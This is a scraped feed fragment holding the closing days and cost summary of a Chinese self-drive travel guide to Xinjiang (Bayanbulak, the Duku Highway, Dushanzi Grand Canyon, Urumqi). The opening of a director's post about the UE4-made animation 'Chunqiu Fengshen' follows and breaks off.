src=\"https://cdn.sspai.com/2021/08/09/article/fc91cbe87b0f90be59236351ac856216\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/3bc64e998cc743c1a7ede7bbf30e0835\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5dbdf8adb0c65f3697502f716e3122d2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d1d4bc0e08778de60e3038e0d6ccbcb8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/09f404093d8febb66a37f4583091353b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/abc0a1ebebf214272d6c123dcd46bd30\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/300a0d4fe56f06b0f758342d6886665b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b31b727f74c8e90a89226ef810606643\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/49bbcdc95c346aa99fe6570df25a09fd\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4de486a159ae241b167fe8442b4aefa0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2b9d776a6fc3308b472cd9be24e96e9a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e5b6209f163e1be89deaa434011d750a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f8e375ca5ddcc2b05ca787c704c955ea\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/35ca0776657b3c82de6282cda63b0a26\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/71f8379efece71a5eefcab8f0388566f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b253f89b1bc297c1886a582ec9de6637\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2eba091f8ae0ca8e5a16d057a2fa7ddb\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b12a06459e00217275f3b64afb16bc50\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4bcde738a01da628997f668f0e5ed8e5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c8cbfb47db21c684817e18a274bf503b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4f37acf5b94277e480a47f20943934b7\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/42a1be3bf0d3cda73d76229170b019b4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1204f2b6e01d9cab9f4416d8080e61e2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/91e6613d20e326ed0e4de5d6cfe36323\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/88063187095c24871e2a283a8282c932\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/cce019d7b7ce39bdecf738e46edb3e5a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c597096f37d39b52f1f5eb832e96fc34\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 14 天：那拉提—独库公路—巴音布鲁克</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5c783e5bd3207d37ebd4f7cc84b29d15\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/604ac47088038054b8a8c596b2d04ea0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><p>⭐️ 景点： 独库公路中段（不到 100 公里）、巴音布鲁克需要区间车进入，晚上看九曲十八弯</p>\n<p>⭐️ 行程：巴音布鲁克不能自驾，时间充裕的话可以向南多跑一些独库公。自驾停到景区的停车场，买票进入景区，景区车 40 分钟到天鹅湖，景区内的天鹅数量并不多，真正的区域已经被保护起来，游客只能够看到饲养的少量天鹅，观感一般。继续换乘景区车到终点九曲十八弯，后面可以坐免费电瓶车（也可以徒步或者骑马）看九曲十八弯。</p>\n<p>九曲十八弯的景色很美，可以先往同心湖的方向走一走，人比观景台那边少很多，风景也很美。然后去观景台等 9 点多的日落。今天刚开始是阴天，也有将要下雨的迹象，不过很多人都在耐心等夕阳出来。</p>\n<p>终于在日落最后的时候，夕阳在云层中探出头出来了几分钟，山顶发出一阵阵惊喜的呼喊。（九曲十八弯在每年 6 月 22 日和 9 月 22 日左右 2 天的时候，最适合拍 9 个太阳）</p>\n<p>临下山的时候，开始下雨，不过景区车很多，没怎么停歇下山到游客中心，然后去住处休息。巴音布鲁克主要的景点是九曲十八弯，时间紧的可以等 8 点左右上山，看完日落下山。</p>\n<p>⭐️ 门票：巴音布鲁克门票+车票 145 元 /人</p>\n<p>⭐️ 住宿地点：巴音布鲁克景区附近蒙古包（2 人间，实际体验还不错）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e49763b0d2b3eb693d412992a50effab\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c8ac570c9be05fbffc04cedf9c4cac3b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/cbf20993eeab4c7ec27bf0dff46c25cc\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/beef039ac5ae75995b538570a650f652\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8963e32a53308174d06948c51dd88893\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/475c7f9a121c1a9d44fc585a7752192a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9ac6e14a37db65e8943d73b51a60ce21\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/3a3994f7d9cdc7701b14f673d2667d8e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/058bfb39dab0e4de569d75eab4c24ec2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0d554a76bbaf7583971c140d3171908d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/97f00b9198cb02b8fb24d5b6dd4f4280\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a251010c0b8a5dd713422db806a171a1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/765558fb520a368e7d1dbb63258e90c6\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/61b7981b3d1a6d6b34c49b0248f5ba96\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 15 天：巴音布鲁克—独库—奎屯（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a39f821be0e3a934bb506c7f44297a9d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/97640c1bcda8f634bc8db9181c421329\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点： 独库公路、独山子大峡谷、安集海大峡谷（需要找小路）</li>\n<li>⭐️ 行程： 早上 9 点从住处出发，开始走独库公路 。 独库公路和伊昭公路差不多，因为每年开放时间只有三四个月，且贯穿天山南北景色极致压缩的路线，所以被很多人推崇。 独库公路 平均海拔 2500 米，全程是 562 千米，不过我们走北段（巴音布鲁克至奎屯 ）大约 280 公里。</li>\n<li>北段这一路会翻越两个 3000 米以上的达坂和一个 2000 米以上的达坂， 独库公路因为海拔和地貌的因素，一路景色多变，有雪山、草原，也有峡谷、山谷溪流，尤其是从巴音布鲁克到乔尔玛这一段，看到的景色比景区还要好，停车的地方也多，非常值得慢慢开慢慢看。</li>\n<li>原本计划去烈士陵园看一下，因为人很多也要赶路就远远了静默了一下之后，继续北上。 独库公路 北上要比南下的车少一些，今天没遇到事故和堵车，倒是经常被牛拦路，大眼睛斜瞪着你，任你耐心等待或鸣笛，自是不动，非常搞笑。</li>\n<li>过了乔尔玛景色比之前差了一些，因为时间来不及，就没有找去安集海大峡谷的小路，只去看了 独山子 大峡谷，门票不贵，车停景区门口买票进景区。 独山子 大峡谷很壮观，但傍晚的光线角度不好，拍了几张照片就离开了。</li>\n<li>走独库公路靠近奎屯的一段直路又看到了车祸，连环撞车也有人受伤，开车时刻不能马虎呀。（ 独库公路路上有停车点和厕所，不过因为人比较多，建议人少的地方就上一次厕所）</li>\n<li>⭐️ 门票： 独山子大峡谷 30 元/人（因为到了是傍晚，光线不好，推荐上午来）</li>\n<li>⭐️ 住宿地点： 奎屯</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2319ee62365a685175efa7ec6d37c73a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d7bd8c479cd57989af6c95189d8398a6\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/64aafc479c5db2c046ee77533f1ea332\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/22fb73782d48c10305fad787ad08b86c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8b56f957b6c9c3d75b2aaf9a095b04f5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e9f45f145704a85bfd2c812e0c31c1a5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fe18474633a21f580802bcdbd2499585\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1585d2e260528c606118d694223af48d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/64a6ac83b3684aa444540fa7e2f01df1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9ac8a46c031216e75a2bbbe72f2d9e15\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e51d4f138c6b0eb0b6e3204ee26679b3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7bda6a716a46ee151972587b292d2017\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/35bcade87d6a5e722df5dfcf6ad7e105\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/38461d736241abc6a07f68d7fe9d5fce\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/deb237a133eb09de6665494906e29730\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/161ac60557c3a522d1d083185e3d36f9\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8ea386a85cbaa24831ae91779aea90ac\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/cff04e14e9da7faba6ed5701fe477647\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bc1d346a35c541401b84b79b49c2f182\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c4d560cbf24557376fc312e53ae1ef9d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6f1ee5c3adeb570167e5c659cd72e00f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6c7b90c4ff9a24eb0ffc0d90345b6c3c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b240e67a9872722a2ec9c12a0d4ac797\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c45353d1023d0c0ebb0096776adee245\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/3124583c5361196dba9153f29518dfd9\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/586cf91b03f647618ab2997391f82d30\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f0fd56ce8c4bb7446e27d0c562c9166d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f8c65e3085cfc3ed736b0cbf4025bf2f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/000466c66705c81f41b62798672c9eb8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7006d10f341b1de271227017e743484b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1fcf5b9230e56855a390e5a6727320e3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4f007f4f027fede9a64fb209f78a8e72\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8c7747138278c66ce10e03c07f6e5ce1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/83ebdb5c6231ed10ec024a5085febfd8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8ea24d54cfdb50e83aa3cfe5c4ee898e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a27372bb6c65a33948eea4f9589f1f37\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f6781e87ac90c79bf0739df40f317f44\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/04a26827372b83da72c4d9a20fe69daa\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6a13b8b5dcc8bd0cd83e04c0d1a257c1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b21ae741bb3cbe7a47f55b4115c37e79\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/eb7b8ac754bf71fb637943e04f04798b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/58fe42f4c2ab2d89a3d1fe268763e7dc\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8ca6956a77aa54e38d3a7ae377a0972c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9acff997bc34f88d4ef678c71ee8454f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/580d34886224a0813f9ffeb1e6e12c23\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1432d05a4c7087b64aae0cd93ea4ab12\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/945aaccbc2dc5c9fe89bce9672bbf1e3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2faa2746884d0645103719976c3e9f67\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/47f2a3e4153b5cf4d9bba611d26a3cd0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 16 天：奎屯—乌鲁木齐市区—北京</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/558bdb4a65175f1d0ecf18f483c6a6cf\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/98287270049c321ac9642d31fe33add7\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点： 乌鲁木齐市大巴扎</li>\n<li>⭐️ 行程：一早从奎屯走高速回乌鲁木齐 ，先去机场还车，把行李临时放在神州租车。打车去大巴扎吃饭买礼品，因为前面的时间一直在看路上和景区的自然风光，初看大巴扎还是挺有意思的，买了些冰箱贴和干果，然后打车去机场回北京 。</li>\n<li>为期 16 天的旅程很快就结束了，从大自然回到城市，不需要每天背着重重的装备，不需要拿着保温杯，也不需要担心突然变化的气温和天气；当然也听不到高山流水的白噪音，看不到璀璨的星空，闻不到草甸的味道，也远离了清新的空气和大自然最野性真实的风光。</li>\n<li>回来，是为了下一次的出发。</li>\n<li>⭐️ 门票： 无</li>\n<li>⭐️ 住宿地点：北京</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/66607809c3efa76fe27a3730bf58e4d3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/760652a937aa4847fa71b7b88f3c7aab\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>费用相关</h2>\n<p>回来之后，没有仔细的算花销，我们俩也不算穷游，整体是 2.5 万–3 万之间吧。主要的花销有机票（两个人来回 8000），租车和油费（5000+3000），过路费 1000 左右，住宿每天 300 左右，吃饭平均每天 200 左右，还有些零七零八的有个两三千。但新疆并不是不适合穷游，一路上看到很多全程自驾住车里的朋友，也有骑行扎帐篷的朋友。如果时间充足，可以选择非旺季，提前订住宿会便宜很多。门票每个时节都差不多，但不一定要打卡每一个大景区，有很多景色绝佳的小景区，人少又方便。新疆，是一个值得多次来的地方。路上也有很多的风景，慢慢走，慢慢看。时刻会有惊喜。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\"> 冲！</a></p>\n","link":"https://sspai.com/post/68182"},{"title":"如何评价国产动画《春秋封神》？","date":"2021-08-13 11:30:10","description":"\n<p></p>\n<p>      大家好，我是动画番剧《春秋封神》的导演李家豪。经过将近两年的紧张制作，这部作品终于能赶在暑期档跟大家见上面了，借这个机会先由衷地感谢一下我们创作团队以及外包制作团队中的每一位成员，感谢大家为这部作品所倾注的心血，谢谢。</p>\n<p>按照惯例先简单跟大家分享一下我们在制作以及创作上的方方面面：</p>\n<a href=\"https://www.zhihu.com/video/1409292364661395458\">用游戏引擎制作动画</a><p>      已经看过前几集的小伙伴应该对上面视频的场景留有印象，《春秋封神》正是基于UE4引擎所制作的作品，对于喜爱玩游戏的小伙伴来说UE4引擎并不算陌生，但是利用游戏引擎来做动画相信大家了解得就比较少了。《春秋封神》运用了大量的引擎新技术，为了全流程跑下来，我们团队还为此开发了一系列的插件用以辅助。总而言之相较于传统动画流程来说，引擎“所见即所得”的特性是极大地提升了导演以及各环节制作人员们的创作空间。</p>\n<a href=\"https://www.zhihu.com/video/1409292678819880961\">动画中的国风舞蹈</a><p>      动作捕捉现场也是制作的重要阵地之一。对于动作捕捉技术，近些年来在国创作品中的应用也是越来越广，为了使《春秋封神》里面的角色“活”起来，我跟团队的小伙伴辗转了全国各大动捕中心，只为了寻找到最理想的动捕技术支持。</p>\n<a href=\"https://www.zhihu.com/video/1409293807939084288\">动画分镜正式制作前的预演</a><a href=\"https://www.zhihu.com/video/1409293981222490112\">角色动作预演</a><p>      小伙伴正在预演中。为了让我们的分镜以及动画师们能快速理解一场戏的表演意图，我们用上了各种手段，在这个过程也有很多欢乐的时刻。在我看来，我们的动画作品想要不断地突破，不仅需要技术革新，创作流程的创新也同样重要。</p>\n<p>   